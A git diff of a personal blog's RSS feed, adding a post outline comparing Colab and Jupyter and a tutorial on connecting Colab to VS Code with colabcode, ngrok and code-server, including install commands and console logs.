@@ -1,4 +1,398 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Yerin-pyon Blog RSS Feed]]></title><description><![CDATA[A personal blog with Gatsby.]]></description><link>https://engelin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 05 May 2023 13:42:25 GMT</lastBuildDate><item><title><![CDATA[Setup Magento 2 with Apache on MacOS]]></title><description><![CDATA[Local Environment Operating System Setup Magento with MAMP 1. Composer 2. MAMP Install MAMP Download Setup 
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Yerin-pyon Blog RSS Feed]]></title><description><![CDATA[A personal blog with Gatsby.]]></description><link>https://engelin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 15 May 2023 10:40:57 GMT</lastBuildDate><item><title><![CDATA[What's the difference between Colab and Jupyter?]]></title><description><![CDATA[What’s the difference between Colab and Jupyter? Summary Jupyter Concept Jupyter Notebook Jupyter Lab Colab Concept  References]]></description><link>https://engelin.github.io/colab-vs-jupyter/</link><guid isPermaLink="false">https://engelin.github.io/colab-vs-jupyter/</guid><pubDate>Fri, 12 May 2023 13:53:56 GMT</pubDate><content:encoded>&lt;h1&gt;What’s the difference between Colab and Jupyter?&lt;/h1&gt;
+&lt;h2&gt;Summary&lt;/h2&gt;
+&lt;h2&gt;Jupyter&lt;/h2&gt;
+&lt;h3&gt;Concept&lt;/h3&gt;
+&lt;h3&gt;Jupyter Notebook&lt;/h3&gt;
+&lt;h3&gt;Jupyter Lab&lt;/h3&gt;
+&lt;h2&gt;Colab&lt;/h2&gt;
+&lt;h3&gt;Concept&lt;/h3&gt;
+&lt;h3&gt;&lt;/h3&gt;
+&lt;h2&gt;References&lt;/h2&gt;</content:encoded></item><item><title><![CDATA[Getting started with colab + vscode]]></title><description><![CDATA[colab + vscode Environment macOS 13 Python 3.11.0 pip 21.2.4 Installation Colab with python lib import Concept  Colab Installations Create a…]]></description><link>https://engelin.github.io/colab-getting-started-vscode/</link><guid isPermaLink="false">https://engelin.github.io/colab-getting-started-vscode/</guid><pubDate>Wed, 10 May 2023 15:35:06 GMT</pubDate><content:encoded>&lt;h1&gt;colab + vscode&lt;/h1&gt;
+&lt;h2&gt;Environment&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;macOS 13&lt;/li&gt;
+&lt;li&gt;Python 3.11.0&lt;/li&gt;
+&lt;li&gt;pip 21.2.4&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Installation Colab with python lib import&lt;/h2&gt;
+&lt;h3&gt;Concept&lt;/h3&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 113px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/85d8b58614a108cc1498799e8af24cf8/2519b/colab_concept.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 17.699115044247787%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHUlEQVQY0z2Pv0vCURxFj6FCuhWVDd/P00KlH1rTe4ZFENHkEPQHWLYJERJShmG0CIpBhattQUMN5eJkQzTV5tDWIEEEDUJDTYYmXjjc5XLh8HPFdOsGb3rNRicDgMczg5IIYmmUaFS3TYcxEe0f98x2t8RS0G47SFRh8zLoLjw3+b2j9F10FnIRZxhIABmfN7otls4qMbtKTEaJSfc4F0vfBvyrAhwCcZKVOYqNGnvV+vBZo8RX3nHxmXSf5lbsIWDLBkc+bzQhlj4WS18rMU9K9IYSU1RiyiK6MjmxPA/sdw9j2TAH9RonLw9D5WaJjx3X1FtqUKUi9r7y6EjgX1nMkohZF8sQskxPfYF+FuPQaju4b0P6MejKv77/ARcTTBKktyeWAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;colab_concept.png&quot;
+        title=&quot;colab_concept.png&quot;
+        src=&quot;/static/85d8b58614a108cc1498799e8af24cf8/2519b/colab_concept.png&quot;
+        srcset=&quot;/static/85d8b58614a108cc1498799e8af24cf8/2519b/colab_concept.png 113w&quot;
+        sizes=&quot;(max-width: 113px) 100vw, 113px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;Colab Installations&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ pip3 &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; colabcode&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Create a new file &lt;code class=&quot;language-text&quot;&gt;colab_getting_started.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; colabcode &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; ColabCode
+
+ColabCode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;12345&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; mount_drive&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Run the file:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ python3 colab_getting_started.py
+
+--2023-05-10 &lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;:58:32--  https://code-server.dev/install.sh
+Resolving code-server.dev &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;code-server.dev&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;104.21&lt;/span&gt;.16.171, &lt;span class=&quot;token number&quot;&gt;172.67&lt;/span&gt;.214.225
+Connecting to code-server.dev &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;code-server.dev&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;104.21&lt;/span&gt;.16.171&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;:443&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. connected.
+HTTP request sent, awaiting response&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;302&lt;/span&gt; Found
+Location: https://raw.githubusercontent.com/cdr/code-server/main/install.sh &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;following&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+--2023-05-10 &lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;:58:33--  https://raw.githubusercontent.com/cdr/code-server/main/install.sh
+Resolving raw.githubusercontent.com &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;185.199&lt;/span&gt;.108.133, &lt;span class=&quot;token number&quot;&gt;185.199&lt;/span&gt;.109.133, &lt;span class=&quot;token number&quot;&gt;185.199&lt;/span&gt;.110.133, &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Connecting to raw.githubusercontent.com &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;185.199&lt;/span&gt;.108.133&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;:443&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. connected.
+HTTP request sent, awaiting response&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt; OK
+Length: &lt;span class=&quot;token number&quot;&gt;15858&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;15K&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;text/plain&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+Saving to: ‘install.sh’
+
+install.sh                                           &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;%&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;.49K  --.-KB/s    &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;.001s  
+
+&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10 &lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;:58:33 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;11.7&lt;/span&gt; MB/s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; - ‘install.sh’ saved &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;15858&lt;/span&gt;/15858&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:58:52.675Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info  Wrote default config &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; to ~/.config/code-server/config.yaml
+Installing extensions&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Installing extension &lt;span class=&quot;token string&quot;&gt;&apos;ms-python.python&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Extension &lt;span class=&quot;token string&quot;&gt;&apos;ms-python.python&apos;&lt;/span&gt; v2023.6.1 was successfully installed.
+Installing extensions&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Extension &lt;span class=&quot;token string&quot;&gt;&apos;ms-toolsai.jupyter&apos;&lt;/span&gt; v2023.3.100 is already installed. Use &lt;span class=&quot;token string&quot;&gt;&apos;--force&apos;&lt;/span&gt; option to update to latest version or provide &lt;span class=&quot;token string&quot;&gt;&apos;@&amp;lt;version&gt;&apos;&lt;/span&gt; to &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; a specific version, &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; example: &lt;span class=&quot;token string&quot;&gt;&apos;ms-toolsai.jupyter@1.2.3&apos;&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
+Installing extensions&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Installing extension &lt;span class=&quot;token string&quot;&gt;&apos;mechatroner.rainbow-csv&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Extension &lt;span class=&quot;token string&quot;&gt;&apos;mechatroner.rainbow-csv&apos;&lt;/span&gt; v3.3.0 was successfully installed.
+Installing extensions&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Installing extension &lt;span class=&quot;token string&quot;&gt;&apos;vscode-icons-team.vscode-icons&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Extension &lt;span class=&quot;token string&quot;&gt;&apos;vscode-icons-team.vscode-icons&apos;&lt;/span&gt; v12.4.0 was successfully installed.
+&lt;span class=&quot;token assign-left variable&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T17:59:15+0100 &lt;span class=&quot;token assign-left variable&quot;&gt;lvl&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;warn &lt;span class=&quot;token assign-left variable&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ngrok config file found at legacy location, move to XDG location&quot;&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;xdg_path&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/Users/xxx/Library/Application Support/ngrok/ngrok.yml&quot;&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;legacy_path&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/Users/xxx/.ngrok2/ngrok.yml
+Code Server can be accessed on: NgrokTunnel: &lt;span class=&quot;token string&quot;&gt;&quot;https://69ca-194-75-100-74.ngrok.io&quot;&lt;/span&gt; -&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;http://localhost:10000&quot;&lt;/span&gt;
+Unknown option: n
+Unknown option: k
+fuser: &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;-cfu&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+        &lt;span class=&quot;token parameter variable&quot;&gt;-c&lt;/span&gt;      &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; is treated as &lt;span class=&quot;token function&quot;&gt;mount&lt;/span&gt; point
+        &lt;span class=&quot;token parameter variable&quot;&gt;-f&lt;/span&gt;      the report is only &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; the named files
+        &lt;span class=&quot;token parameter variable&quot;&gt;-u&lt;/span&gt;      print username of pid &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; parenthesis
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.781Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info  code-server &lt;span class=&quot;token number&quot;&gt;4.12&lt;/span&gt;.0 1da7cda39e54faa087cf129f0f85d4d4e63e81b8
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.782Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info  Using user-data-dir ~/.local/share/code-server
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.789Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info  Using config &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; ~/.config/code-server/config.yaml
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.789Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info  HTTP server listening on http://127.0.0.1:10000/
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.789Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info    - Authentication is enabled
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.789Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info      - Using password from &lt;span class=&quot;token variable&quot;&gt;$PASSWORD&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2023&lt;/span&gt;-05-10T16:59:16.789Z&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; info    - Not serving HTTPS&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Open the URL in your browser:&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/045d87410e055a5f1a070d4914c5b8a8/f3d76/colab_local_pw.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB4UlEQVQ4y52RS08TURTHZyVaqWAgQkyMRk3cufJzoH4Bu2IBY0zcUdKS6EaaiM+WIAE2fgQ/gfEFQqmQGGOiblyQ0s50HnfunfuY+Zs7M2CJMTSd5Jdz7plzfvfeGePc0Jnr4+MjC5evXpu/eOnK/MjoWOVULl85MZCrDJw8ntzpfGX47Oijwfzwk8H80A2jPPdgslp7hcWlFVQXl/H0WQ2PF170zPOXS1hde41qbRmluYf3jW/ff91B+oQARJ/oWfz4+XvK+LReL9gOhUdE5Po8dn2OlBCOl+JqDuv/EHtEqI7L8HlrxzQ2NhsFj4QImIoIlXHAJAiVoGEExuMEnev6wTtNV65nlB9w1Bu7WridCWVEqIgJFUlz23aw12yhuW8lOQslQqEgVAwuI6R9QsfehK5PYXVcdFwfjkeSNQ0FKAcojxNhesIehJRJdIjAnk1hEwXLl2h7Eg4VePOW40NDQCoBP/ivkB0Ks2vACzj0RknM0EO2y+F4/OC6XcLwr1D/0YAppT9wNwHryrNI2dF61ic9wlHf3p02Nrd2CoQqhAKKccR9IgMWofHlq2m8e79RaLYctG0fLas/2paP/ZaLj+t105iavnu+OFu+NVMsTcwUSzf7ZKI4W75tmvcu/AE/+1XCg7M2KgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;colab_local_pw.png&quot;
+        title=&quot;colab_local_pw.png&quot;
+        src=&quot;/static/045d87410e055a5f1a070d4914c5b8a8/f058b/colab_local_pw.png&quot;
+        srcset=&quot;/static/045d87410e055a5f1a070d4914c5b8a8/c26ae/colab_local_pw.png 158w,
+/static/045d87410e055a5f1a070d4914c5b8a8/6bdcf/colab_local_pw.png 315w,
+/static/045d87410e055a5f1a070d4914c5b8a8/f058b/colab_local_pw.png 630w,
+/static/045d87410e055a5f1a070d4914c5b8a8/40601/colab_local_pw.png 945w,
+/static/045d87410e055a5f1a070d4914c5b8a8/78612/colab_local_pw.png 1260w,
+/static/045d87410e055a5f1a070d4914c5b8a8/f3d76/colab_local_pw.png 3248w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;
+&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/05f7c0360bd6448336c29950290e22ef/f3d76/colab_local.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAAC10lEQVQ4y52SXUiTURjHd6VlClZON1FJSe0qMLQMP5riRRbuLYpCChdRQUmQ0V0WBEEKzo+yLvrQSPtA6iLUkG76oJsK8qtpas7a5tK96qab2/tx3ucfezdFK2868OPhOed5fjycczTbMzO3p6Umm7ekZdSkpWXUxGn1teujYmojIqNqI9dtqI2IXAP1LEqtjd0YdyM6JrY+OiY2W7N1a/rpCxcv4f6DVjQ330FDYxPM9Y2oMzegzly/Iq7GHNyvq0dj0y20tD7ErebbqK6+WqVJ0Okq3rx9CwACAOk/CfbCbref1ej1elNnZ2cwV/x+PzmdTjgcDgiCAMYYZFlWYQoLlgBgqyBixBhjkiRhcHCwUhV2d3erQlEUybsYAJECIlpGHd8vw2n1gZ8U4ZoU8cshwmETMe9hwYKgExaLpVKj1WpNXV1dIaEkE+8VEJAULC1FCQltFj9qjlhx7ehPXD5mQ9UxG8qNP9D2aE4VStI/hLIsUXB0phCUpQnDbtvXAK7ss+B88QBOlfTjZNkg9hn60drCry0URJFc/Ax8Pi98ARGqXA4ZrX2LyEk/g+SUAiTqC5GUVIAN0XlouvkxLJT/FvpFmexTM5jhXeB5HrNzbng885AVAc4xP46XX0fZoRPYX1YB7qAJhYZyPOvoDwulsDBOu/TKTJYkmp1x0dTUNLmmp2nYPkuehUUSBYEURSHGQlDoYlciBwVDQ0PnNNoEranndQ/C/4DcPi+55+dIEAMkE1P5o5kYQLx3kdwLHvJ4F8gX8MvuhXn0DfRVajKSt5ke330K5+g0Rr6MY6zXitFw/N5nxVjvOIY/j2Lo04gaJ/on8OH9N9xre4eO1pd49rATL9pf4Xl7N560dFRqshJyE/NTSg7k6oqMu+INXK6uiNutK+JyEwzLZG/O53ZsyuNy4gq4nfEGbk9iEcel7+VKMzmuNMPIlWYajQeyDh/MTy1O/g1sd/1wWSm5+gAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;colab_local.png&quot;
+        title=&quot;colab_local.png&quot;
+        src=&quot;/static/05f7c0360bd6448336c29950290e22ef/f058b/colab_local.png&quot;
+        srcset=&quot;/static/05f7c0360bd6448336c29950290e22ef/c26ae/colab_local.png 158w,
+/static/05f7c0360bd6448336c29950290e22ef/6bdcf/colab_local.png 315w,
+/static/05f7c0360bd6448336c29950290e22ef/f058b/colab_local.png 630w,
+/static/05f7c0360bd6448336c29950290e22ef/40601/colab_local.png 945w,
+/static/05f7c0360bd6448336c29950290e22ef/78612/colab_local.png 1260w,
+/static/05f7c0360bd6448336c29950290e22ef/f3d76/colab_local.png 3248w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;Ngrok Setup&lt;/h3&gt;
+&lt;p&gt;You might meet the following error:&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/a14ae9d610289c9a4358f8a1a64e58ef/f3d76/ngrok_server_error.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
